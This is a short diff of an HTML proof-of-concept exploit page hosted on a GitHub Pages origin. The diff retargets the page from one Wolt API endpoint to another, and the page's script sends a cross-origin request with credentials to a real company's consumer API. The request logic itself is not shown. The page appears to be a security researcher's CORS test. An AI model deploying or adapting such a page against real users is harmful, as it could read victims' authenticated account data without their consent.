@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://converse-api.wolt.com/widget-api/v1/wolt-consumer/contact</code></p>
+    <p>Target: <code>https://gatekeeper.wolt.com/v1/consumer</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://converse-api.wolt.com/widget-api/v1/wolt-consumer/contact";
+        const target = "https://gatekeeper.wolt.com/v1/consumer";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
